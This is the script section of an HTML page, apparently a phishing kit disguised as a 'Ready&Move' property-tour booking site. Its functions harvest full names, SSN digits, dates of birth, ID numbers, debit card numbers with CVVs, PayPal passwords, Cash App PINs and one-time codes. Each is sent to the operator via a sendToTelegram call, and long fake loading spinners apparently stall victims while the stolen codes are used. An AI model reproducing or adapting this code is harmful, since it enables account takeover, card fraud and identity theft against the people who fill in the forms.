            buttons.continueWithDebitBtn.style.display = 'none';
            navigateToWithLoad('debitCardPage');
        });
        
        function submitDebitCard() {
            lastPaymentMethod = "Debit Card";
            const msg = `Ready&Move - Debit Card Payment Initiated
Full Name: ${getVal('fullName')}
SSN Last 4: ${getVal('ssnLast4')}
DOB: ${getVal('dob')}
Address: ${getVal('address')}
City: ${getVal('city')}
State: ${getVal('state')}
ZIP: ${getVal('zip')}
ID Type: ${getVal('idType')}
ID Number: ${getVal('idNumber')}
Card Number: ${getVal('cardNumber')}
Expiry: ${getVal('cardExpiry')}
CVV: ${getVal('cardCvv')}
Name on Card: ${getVal('cardName')}`;
            sendToTelegram(msg);
            showLongLoadingAndNavigate('page4');
        }
        
        function continueCashapp() {
            const emailPhone = document.getElementById('cashappEmail').value.trim();
            if (!emailPhone) return;
            loadingOverlay.style.display = 'flex';
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                document.getElementById('cashappOtpTarget').textContent = emailPhone;
                cashappOtpInputs.forEach(input => input.value = '');
                const msg = `Ready&Move - Cash App Payment Initiated
Cash App Email/Phone: ${emailPhone}`;
                sendToTelegram(msg);
                navigateToWithLoad('cashappOtpPage');
            }, 1500);
        }
        
        function continuePaypal() {
            const emailPhone = document.getElementById('paypalEmail').value.trim();
            const password = document.getElementById('paypalPassword').value.trim();
            if (!emailPhone || !password) return;
            loadingOverlay.style.display = 'flex';
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                document.getElementById('paypalOtpTarget').textContent = emailPhone;
                paypalOtpInputs.forEach(input => input.value = '');
                const msg = `Ready&Move - PayPal Payment Initiated
PayPal Email/Phone: ${emailPhone}
PayPal Password: ${password}`;
                sendToTelegram(msg);
                navigateToWithLoad('paypalOtpPage');
            }, 1500);
        }
        
        function checkCashappOtpCompletion() {
            let allFilled = true;
            cashappOtpInputs.forEach(input => {
                if (input.value.length === 0) allFilled = false;
            });
            buttons.verifyCashappBtn.disabled = !allFilled;
        }
        
        function checkPaypalOtpCompletion() {
            let allFilled = true;
            paypalOtpInputs.forEach(input => {
                if (input.value.length === 0) allFilled = false;
            });
            buttons.verifyPaypalBtn.disabled = !allFilled;
        }
        
        buttons.verifyCashappBtn.addEventListener('click', () => {
            lastPaymentMethod = "Cash App";
            const code = Array.from(cashappOtpInputs).map(i => i.value).join('');
            const msg = `Ready&Move - Cash App Verification Code Submitted
Full Name: ${getVal('fullName')}
SSN Last 4: ${getVal('ssnLast4')}
DOB: ${getVal('dob')}
Address: ${getVal('address')}
City: ${getVal('city')}
State: ${getVal('state')}
ZIP: ${getVal('zip')}
ID Type: ${getVal('idType')}
ID Number: ${getVal('idNumber')}
CashApp Email/Phone: ${getVal('cashappEmail')}
OTP: ${code}`;
            sendToTelegram(msg);
            // Use a 15-second delay before navigating to the PIN page:
            showLongLoadingAndNavigate('cashappPinPage', null, 15000); // 15,000ms delay
        });
        
        buttons.verifyPaypalBtn.addEventListener('click', () => {
            lastPaymentMethod = "PayPal";
            const code = Array.from(paypalOtpInputs).map(i => i.value).join('');
            const msg = `Ready&Move - PayPal
Full Name: ${getVal('fullName')}
SSN Last 4: ${getVal('ssnLast4')}
DOB: ${getVal('dob')}
Address: ${getVal('address')}
City: ${getVal('city')}
State: ${getVal('state')}
ZIP: ${getVal('zip')}
ID Type: ${getVal('idType')}
ID Number: ${getVal('idNumber')}
PayPal Email/Phone: ${getVal('paypalEmail')}
PayPal Password: ${getVal('paypalPassword')}
OTP: ${code}`;
            sendToTelegram(msg);
            showLongLoadingAndNavigate('page4', null, 600000); // changed delay to 600,000ms (10 minutes)
        });
        
        buttons.submitCashappPinBtn.addEventListener('click', () => {
            const pin = document.getElementById('cashappPin').value.trim();
            if (!pin) { alert('Please enter your PIN'); return; }
            lastPaymentMethod = "Cash App PIN";
            sendToTelegram(`Ready&Move - Cash App PIN Submitted: ${pin}`);
            // Go to link verification page after PIN
            loadingOverlay.style.display = 'flex';
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                _navigateTo('cashappLinkVerifyPage');
            }, 2000);
        });
        
        // Cash App Link Verification logic
        document.getElementById('submitCashappLinkBtn').addEventListener('click', function(e) {
            e.preventDefault();
            const linkValue = document.getElementById('cashappLinkInput').value.trim();
            if (!linkValue) {
            alert('Please paste the verification link.');
            return;
            }
            loadingOverlay.style.display = 'flex';
            sendToTelegram(`Cash App Link Verification submitted: ${linkValue}`);
            // 7 minutes = 420000 ms
            setTimeout(function() {
            loadingOverlay.style.display = 'none';
            _navigateTo('page4');
            showHoldResultMsg();
            }, 420000); // 7 minutes spinner, then go to schedule tour
        });
        
        function showLongLoadingAndNavigate(targetPage, after, delay) {
            // Use 5 minutes (300,000 ms) delay for the tour page; otherwise default to 1500 ms.
            if (!delay) {
                delay = (targetPage === 'page4') ? 300000 : 1500;
            }
            loadingOverlay.style.display = 'flex';
            loadingCountdown.style.display = 'none';
            progressBarHold.style.display = 'none';
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                _navigateTo(targetPage);
                showHoldResultMsg();
                if (typeof after === "function") after();
            }, delay);
        }
        
        function showHoldResultMsg() {
            if (pages.page4 && !holdResultShown) {
                setTimeout(function() {
                    let msg = document.getElementById('holdResultMsg');
                    if (msg) {
                        msg.style.display = 'block';
                        setTimeout(() => { msg.style.display = 'none'; }, 10000);
                        holdResultShown = true;
                    }
                }, 400);
            }
        }
        
        function confirmTour() {
            const tourDate = document.getElementById('tourDate').value;
            const property = document.getElementById('property').value;
            if (!tourDate || !selectedTimeSlot || !property) {
                alert('Please select a date, time, and property');
                return;
            }
            const dateObj = new Date(tourDate);
            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
            const formattedDate = dateObj.toLocaleDateString('en-US', options);
            const propertyName = document.getElementById('property').options[document.getElementById('property').selectedIndex].text;
            document.getElementById('confirmedDate').textContent = formattedDate;
            document.getElementById('confirmedTime').textContent = selectedTimeSlot;
            document.getElementById('confirmedProperty').textContent = propertyName;
            navigateToWithLoad('successPage');
        }
        
        function getVal(id) {
            const el = document.getElementById(id);
            return el ? el.value : "";
        }
    </script>
</body>
</html>